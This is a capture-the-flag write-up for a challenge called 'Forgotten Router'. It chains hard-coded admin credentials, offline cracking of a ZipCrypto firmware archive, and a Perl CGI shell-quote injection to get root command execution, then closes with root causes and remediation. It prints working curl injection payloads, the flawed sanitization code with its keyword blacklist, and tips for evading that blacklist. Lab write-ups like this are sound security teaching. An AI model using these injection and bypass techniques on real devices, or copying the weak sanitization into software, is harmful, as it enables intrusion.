[README.md](https://github.com/user-attachments/files/33924915/README.md)
# Forgotten-Router# 🔐 Forgotten Router — CTF Writeup

> *A forgotten device after the chaos. LEDs still blinking, its firmware still listens for a request that can finally end its misery.*

![Category](https://img.shields.io/badge/category-Web%20%2F%20Network-orange)
![Difficulty](https://img.shields.io/badge/difficulty-Medium-yellow)
![Points](https://img.shields.io/badge/points-125-blue)
![Status](https://img.shields.io/badge/status-Solved-success)
![Act](https://img.shields.io/badge/Act-02-lightgrey)

**Target:** <https://router.challs.packetcapture.xyz>
**Flag:**

```text
PacketCapture{r0ut3_99_bb6cfead}
```

---

## 📑 Table of Contents

- [TL;DR](#tldr)
- [Challenge Overview](#challenge-overview)
- [Reconnaissance](#reconnaissance)
- [Step 1 — Weak Hard-Coded Credentials](#step-1--weak-hard-coded-credentials)
- [Step 2 — Leak & Crack the Firmware](#step-2--leak--crack-the-firmware)
- [Step 3 — Source Audit & Root Cause](#step-3--source-audit--root-cause)
- [Step 4 — Remote Code Execution](#step-4--remote-code-execution)
- [Step 5 — Capture the Flag](#step-5--capture-the-flag)
- [Full Kill Chain](#full-kill-chain)
- [Why It Worked (Root Causes)](#why-it-worked-root-causes)
- [Remediation](#remediation)
- [Tools Used](#tools-used)
- [Repository Contents](#repository-contents)
- [Disclaimer](#disclaimer)

---

## TL;DR

A chain of four weaknesses turns a "forgotten router" into **root remote code execution**:

1. **Hard-coded credentials** (`admin:123456`) on the CGI login.
2. An **authenticated firmware download** protected only by legacy **ZipCrypto** with a weak passphrase (`relics1`), leaking the Perl source.
3. A **sanitization typo** in `diagnostics.cgi` — `s/'//` (strips only the *first* quote) instead of `s/'//g` — enabling a shell-quote breakout in the traceroute feature.
4. Command injection runs as **root**, revealing the flag in `/www/cgi-bin/.flag.txt`.

---

## Challenge Overview

| | |
|---|---|
| **Name** | Forgotten Router |
| **Event** | PacketCapture — Act 02 |
| **Category** | Uncategorized (Web / Network) |
| **Base points** | 125 |
| **Target** | `https://router.challs.packetcapture.xyz` |
| **Stack** | `busybox httpd/1.30.1`, Perl CGI (`CGI.pm`, `CGI::Session`) |
| **Firmware** | vRouter `0.1-beta` · build `0566.23.2` |
| **Session cookie** | `CGISESSID` (stored under `/tmp/sessions/`) |

---

## Reconnaissance

The web root immediately redirects to a CGI login:

```bash
curl -i https://router.challs.packetcapture.xyz/
# HTTP/2 302  location: /cgi-bin/login.cgi
```

Enumerating `/cgi-bin/` reveals a classic embedded-router interface:

| Endpoint | Purpose |
|---|---|
| `login.cgi` | Authentication |
| `index.cgi` | Admin console (SPA shell) |
| `wireless.cgi` | Wireless status / connected clients |
| `diagnostics.cgi` | **Ping & traceroute tools** |
| `administration.cgi` | Firmware upgrade history / downloads |

All pages except `login.cgi` return `302 → login.cgi` without a valid session.

---

## Step 1 — Weak Hard-Coded Credentials

The login accepts a single hard-coded account (confirmed later in the source):

```perl
sub validate_account {
    my($u, $p) = @_;
    return $u eq 'admin' && $p eq '123456';
}
```

Authenticate and save the session cookie:

```bash
curl -c cj.txt -X POST \
  https://router.challs.packetcapture.xyz/cgi-bin/login.cgi \
  -d 'username=admin&password=123456'

# HTTP/2 302  location: /cgi-bin/index.cgi
# Set-Cookie: CGISESSID=...; path=/
```

> ⚠️ Sessions are short-lived. If a request starts returning `302` to the login page,
> simply re-authenticate to obtain a fresh `CGISESSID`.

---

## Step 2 — Leak & Crack the Firmware

The **Administration** page links a firmware archive:

```bash
curl -b cj.txt -o build-0.1-beta.zip \
  https://router.challs.packetcapture.xyz/build-0.1-beta.zip
```

The zip listing already exposes a suspicious file alongside the CGI sources:

```text
cgi-bin/.flag.txt
cgi-bin/diagnostics.cgi
cgi-bin/login.cgi
...
```

The archive uses **legacy ZipCrypto** (not AES) and is password-protected. ZipCrypto is
deliberately weak and fast to attack offline. Cracking with `rockyou.txt` recovers the
passphrase **`relics1`** (around the 4.3-millionth entry — easy to miss on short lists):

```bash
# Using the custom native cracker included in this repo
gcc -O3 -o fcrack fcrack.c -lz
./fcrack build-0.1-beta.zip 'cgi-bin/.flag.txt' < rockyou.txt
# [+] PASSWORD: relics1

# ...or with standard tooling
zip2john build-0.1-beta.zip > hash.txt
john hash.txt --wordlist=rockyou.txt
```

Extract everything:

```bash
unzip -P relics1 build-0.1-beta.zip
```

The bundled `cgi-bin/.flag.txt` only contains the placeholder `FLAGHERE` — a **decoy**.
The real flag lives on the running device, so the Perl source is the real prize here.

---

## Step 3 — Source Audit & Root Cause

`diagnostics.cgi` interpolates user input straight into shell commands behind a naive
blacklist. Compare the two diagnostic functions:

```perl
sub run_ping {
    my ($target) = @_;

    # filter dangerous keywords..
    $target =~ s/bash//g;
    $target =~ s/sh//g;
    $target =~ s/cat//g;
    $target =~ s/ls//g;
    $target =~ s/bin//g;

    # stop attempts to break out of string..
    $target =~ s/'//g;                 # ✅ /g removes ALL single quotes

    return `ping -c 1 '$target'`;
}

sub run_traceroute {
    my ($target) = @_;

    # filter dangerous keywords..
    $target =~ s/bash//g;
    $target =~ s/sh//g;
    $target =~ s/cat//g;
    $target =~ s/ls//g;
    $target =~ s/bin//g;

    # stop attempts to break out of string..
    $target =~ s/'//;                  # ❌ missing /g -> removes only the FIRST quote

    return `traceroute '$target'`;
}
```

The traceroute handler removes only the **first** single quote. Supplying **two** quotes
leaves one in place, which closes the shell's opening `'` and lets us inject arbitrary
commands. The keyword blacklist (`bash`, `sh`, `cat`, `ls`, `bin`) is easily sidestepped
by choosing other binaries and relative paths.

---

## Step 4 — Remote Code Execution

Send a traceroute request whose `value` contains a quote-breakout. The first `'` is
stripped server-side; the survivors form valid shell syntax:

```bash
curl -b cj.txt -X POST \
  https://router.challs.packetcapture.xyz/cgi-bin/diagnostics.cgi \
  --data-urlencode 'action=traceroute' \
  --data-urlencode "value=''; id; echo '"
```

How the shell sees it after filtering and string wrapping:

```bash
traceroute ''; id; echo ''
```

Response:

```text
uid=0(root) gid=0(root) groups=0(root)
```

**Remote code execution as root.** The CGI's working directory is `/www/cgi-bin`.

---

## Step 5 — Capture the Flag

Two blacklist traps to avoid:

- The literal path `cgi-bin` contains **`bin`**, which the filter deletes — so use a
  **relative path** (the current directory already *is* `/www/cgi-bin`).
- `cat` is blocked — use `grep`, `head`, `tac`, or `od` instead.

Locate and read the only file containing the `PacketCapture` marker:

```bash
curl -b cj.txt -X POST \
  https://router.challs.packetcapture.xyz/cgi-bin/diagnostics.cgi \
  --data-urlencode 'action=traceroute' \
  --data-urlencode "value=''; grep -a PacketCapture .flag.txt; echo '"
```

Output:

```text
PacketCapture{r0ut3_99_bb6cfead}
```

Verified byte-for-byte with `od -c` (33 bytes including the trailing newline).

---

## Full Kill Chain

```text
                 ┌──────────────────────────────────────────────┐
                 │  router.challs.packetcapture.xyz             │
                 │  busybox httpd + Perl CGI                    │
                 └──────────────────────────────────────────────┘
   1. POST login.cgi  admin:123456  ───────────────►  CGISESSID cookie
   2. GET  build-0.1-beta.zip       ───────────────►  ZipCrypto firmware
   3. offline crack (rockyou)       ───────────────►  passphrase "relics1"
   4. audit diagnostics.cgi         ───────────────►  s/'//  (missing /g)
   5. traceroute quote breakout     ───────────────►  RCE as root (uid=0)
   6. grep PacketCapture .flag.txt  ───────────────►  🚩 FLAG
```

---

## Why It Worked (Root Causes)

1. **Hard-coded, weak credentials** — `admin:123456` baked into the CGI.
2. **Sensitive source disclosure** — firmware downloadable by any logged-in user.
3. **Obsolete, weak archive encryption** — ZipCrypto plus a crackable passphrase.
4. **Inconsistent input sanitization** — `s/'//` vs `s/'//g` leaves a quote in place.
5. **Unsafe command construction** — user input interpolated into a backtick shell string
   instead of being passed as an argument list.
6. **Over-privileged service** — the web CGI runs as `root`, so injection is full RCE.
7. **Deniable keyword blacklist** — blocking `cat/ls/bin/...` gives false assurance and
   is trivially bypassed with equivalent tools.

---

## Remediation

- **Never build shell strings from user input.** Use argument-array execution
  (e.g. Perl `system('traceroute', $target)`) or a validated IP/hostname parser; reject
  anything that is not a strict IP or RFC-1123 hostname.
- Replace blacklists with **allowlists**; apply consistent, global filtering (`/g`) if
  filtering is ever needed.
- Remove hard-coded credentials; salt-and-hash passwords and enforce strong defaults.
- Run the web/CGI process as an **unprivileged user**, not root.
- Stop distributing source/firmware to low-privilege users; use **AES-256** (e.g. `7z`/AES)
  with strong, unique passphrases if archives must be protected.
- Add server-side rate limiting / crash recovery to reduce abuse and noisy failures.

---

## Tools Used

| Tool | Purpose |
|---|---|
| `curl` | HTTP enumeration, authenticated requests, payload delivery |
| custom `fcrack.c` | Fast native ZipCrypto offline cracker (this repo) |
| `pyzipper` | Reference ZipCrypto implementation / verification |
| `rockyou.txt` | Password wordlist |
| `unzip` | Firmware extraction |
| `grep`, `od`, `find` | In-target file discovery & flag verification |

---

## Repository Contents

```text
.
├── README.md                 # This writeup
├── SOLUTION.md               # Concise solution notes
├── FLAG.txt                  # Recovered flag
├── build-0.1-beta.zip        # Captured firmware (ZipCrypto, pass: relics1)
├── fcrack.c                  # Native ZipCrypto cracker (gcc -O3 ... -lz)
├── crack_lib.py              # Python (pyzipper) reference cracker
└── firmware/
    └── cgi-bin/
        ├── login.cgi         # Hard-coded admin:123456
        ├── diagnostics.cgi   # ← s/'// quote-breakout → root RCE
        ├── index.cgi
        ├── wireless.cgi
        ├── administration.cgi
        └── .flag.txt         # Decoy ("FLAGHERE"); real flag is on the host
```

---

## Disclaimer

This writeup is for **educational and authorized security research only**. All testing was
performed against a designated Capture-The-Flag target. Only test systems you own or have
explicit written permission to assess. Unauthorized access to computer systems is illegal.

---

<p align="center">
Made for the <b>PacketCapture</b> CTF · Act 02 — Forgotten Router
</p>
